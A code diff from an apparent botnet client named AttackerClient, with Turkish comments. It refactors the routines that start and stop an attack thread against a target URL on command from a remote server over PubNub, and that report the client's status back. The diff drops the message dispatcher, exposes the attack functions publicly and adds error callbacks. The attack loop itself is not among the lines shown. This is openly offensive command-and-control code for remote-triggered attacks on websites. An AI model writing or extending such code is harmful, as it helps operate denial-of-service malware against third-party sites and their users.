@@ -66,53 +66,17 @@ namespace AttackerClient
         }
 
         /// <summary>
-        /// Gönderilen mesajı yorumlar ve gereken işlemi başlatır
-        /// </summary>
-        /// <param name="message"></param>
-        /// <param name="pubnub"></param>
-        /// <param name="SenderId"></param>
-        /// <param name="Status"></param>
-        /// <param name="Data"></param>
-        public static void HandleMessage(MessageDTO message, Pubnub pubnub, string SenderId, ref ClientStatusType Status, ref string Data)
-        {
-            /*
-             Eğer client tarafından karşılanan bir mesaj ise bu değer true yapılır
-             */
-            bool isHandled = false;
-
-            switch (message.MessageType)
-            {
-                case MessageType.TextToClients:
-                    WriteMessage(message.Data);
-                    isHandled = true;
-                    break;
-                case MessageType.StartAttack:
-                    StartAttack(ref Status, ref Data, message.Data);
-                    isHandled = true;
-                    break;
-                case MessageType.StopAttack:
-                    StopAttack(ref Status, ref Data);
-                    isHandled = true;
-                    break;
-                default:
-                    break;
-            }
-
-            //Eğer mesaj handle edildiyse son durum server ile paylaşılıyor
-            if (isHandled)
-            {
-                PublishStatusMessage(pubnub, SenderId, ref Status, ref Data);
-            }
-        }
-
-        /// <summary>
         /// Saldırıyı başlatır
         /// </summary>
         /// <param name="url"></param>
-        private static void StartAttack(ref ClientStatusType Status, ref string Data, string url)
+        public static void StartAttack(ref ClientStatusType Status, ref string Data, string url, Func<Exception, bool> afterError)
         {
-            Status = ClientStatusType.Attacking;
-            Data = url;
+            /*
+             Saldırı önce durdurulup tekrar başlatılıyor
+             */
+            StopAttack(ref Status, ref Data);
+
+            bool isStartedAttack = false;
 
             if (trdAttack == null)
             {
@@ -133,19 +97,27 @@ namespace AttackerClient
                             }
                         }
                     }
+                    catch(ThreadAbortException ee)
+                    {
+                        return;
+                    }
                     catch (Exception ee)
                     {
                         WriteMessage("Error: " + ee.Message);
+                        afterError(ee);
+                        
                     }
                 });
                 trdAttack.Start();
-            }
-            else if (!trdAttack.IsAlive)
-            {
-                trdAttack.Start();
+                isStartedAttack = true;
             }
 
-            WriteMessage("Attacking started to " + url);
+            if(isStartedAttack)
+            {
+                Status = ClientStatusType.Attacking;
+                Data = url;
+            }
+
         }
 
         /// <summary>
@@ -161,7 +133,7 @@ namespace AttackerClient
         /// Saldırıyı durdurur
         /// </summary>
         /// <param name="url"></param>
-        private static void StopAttack(ref ClientStatusType Status, ref string Data)
+        public static void StopAttack(ref ClientStatusType Status, ref string Data)
         {
             Status = ClientStatusType.Normal;
             Data = String.Empty;
@@ -179,7 +151,7 @@ namespace AttackerClient
         /// Ekrana mesajı yazar
         /// </summary>
         /// <param name="message"></param>
-        private static void WriteMessage(string message)
+        public static void WriteMessage(string message)
         {
 #if DEBUG
             Console.WriteLine(message);
